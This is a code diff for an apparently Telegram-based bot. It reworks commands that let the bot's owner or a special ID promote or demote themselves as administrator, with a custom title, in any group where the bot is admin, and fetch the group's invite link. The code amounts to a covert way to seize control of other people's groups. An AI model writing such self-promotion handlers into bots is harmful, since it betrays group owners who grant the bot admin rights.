@@ -11,8 +11,8 @@ async def rpromote(client, message: Message):
     try:
         # Extracting user_id and group_id from the message
         args = message.text.split()
-     #   group_id = args[1]
-#        admin_tag = args[2] if len(args) > 2 else "ㅤ"
+        group_id = args[1]
+        admin_tag = ' '.join(args[2:]) if len(args) > 2 else "Champu"
 
         # Resolve the ɢʀᴏᴜᴘ or username to an actual group_id if provided
         if group_id.startswith("https://t.me/"):
@@ -27,7 +27,7 @@ async def rpromote(client, message: Message):
     except (ValueError, IndexError):
         return await message.reply_text("ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ, ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ, ᴏʀ ɢʀᴏᴜᴘ.")
 
-    ALONE = await message.reply_text(
+    CHAMPU = await message.reply_text(
         f"ᴀᴛᴛᴇᴍᴘᴛɪɴɢ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>..."
     )
 
@@ -48,16 +48,12 @@ async def rpromote(client, message: Message):
             ),
         )
         
-          # Check if admin tag is provided
-        admin_tag = args[2] if len(args) > 2 else "ㅤ"
-        await app.set_administrator_title(group_id, message.from_user.id, admin_tag)
-        
         # Check if the group is a supergroup
-     #   group = await client.get_chat(group_id)
-     #   if group.type == "supergroup":
-        #    await app.set_administrator_title(group_id, message.from_user.id, admin_tag)
-    #        invite_link = await group.export_invite_link()
-            await ALONE.edit(
+        group = await client.get_chat(group_id)
+        if group.type == "supergroup":
+            await app.set_administrator_title(group_id, message.from_user.id, admin_tag)
+            invite_link = await group.export_invite_link()
+            await CHAMPU.edit(
                 f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ {message.from_user.mention} ᴛᴏ ᴀᴅᴍɪɴ ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code> ᴡɪᴛʜ ᴛʜᴇ ᴛɪᴛʟᴇ: {admin_tag}",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("ɢʀᴏᴜᴘ", url=invite_link)]
@@ -65,7 +61,7 @@ async def rpromote(client, message: Message):
             )
         else:
             invite_link = await group.export_invite_link()
-            await ALONE.edit(
+            await CHAMPU.edit(
                 f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ {message.from_user.mention} ᴛᴏ ᴀᴅᴍɪɴ ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>.",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("ɢʀᴏᴜᴘ", url=invite_link)]
@@ -73,11 +69,11 @@ async def rpromote(client, message: Message):
             )
 
     except ChatAdminRequired:
-        await ALONE.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ ʏᴏᴜ.")
+        await CHAMPU.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ ʏᴏᴜ.")
     except UserNotParticipant:
-        await ALONE.edit("ᴇʀʀᴏʀ: ʏᴏᴜ ᴍᴜsᴛ ʙᴇ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴇ ɢʀᴏᴜᴘ ᴛᴏ ʙᴇ ᴘʀᴏᴍᴏᴛᴇᴅ.")
+        await CHAMPU.edit("ᴇʀʀᴏʀ: ʏᴏᴜ ᴍᴜsᴛ ʙᴇ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴇ ɢʀᴏᴜᴘ ᴛᴏ ʙᴇ ᴘʀᴏᴍᴏᴛᴇᴅ.")
     except RPCError as e:
-        await ALONE.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")
+        await CHAMPU.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")
 
 @app.on_message(filters.command("demoteme") & (filters.user(OWNER_ID) | filters.user(SPECIAL_ID)))
 async def rdemote(client, message: Message):
@@ -96,7 +92,7 @@ async def rdemote(client, message: Message):
     except (ValueError, IndexError):
         return await message.reply_text("ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ɢʀᴏᴜᴘ ɪᴅ, ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ, ᴏʀ ɢʀᴏᴜᴘ.")
 
-    ALONE = await message.reply_text(
+    CHAMPU = await message.reply_text(
         f"ᴀᴛᴛᴇᴍᴘᴛɪɴɢ ᴛᴏ ᴅᴇᴍᴏᴛᴇ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>..."
     )
 
@@ -117,9 +113,9 @@ async def rdemote(client, message: Message):
             ),
         )
         
-        await ALONE.edit(f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>.")
+        await CHAMPU.edit(f"sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ {message.from_user.mention} ɪɴ ᴛʜᴇ ɢʀᴏᴜᴘ <code>{group_id}</code>.")
     
     except ChatAdminRequired:
-        await ALONE.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴅᴇᴍᴏᴛᴇ ʏᴏᴜ.")
+        await CHAMPU.edit("ᴇʀʀᴏʀ: ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴅᴇᴍᴏᴛᴇ ʏᴏᴜ.")
     except RPCError as e:
-        await ALONE.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")
+        await CHAMPU.edit(f"ᴀɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {str(e)}")
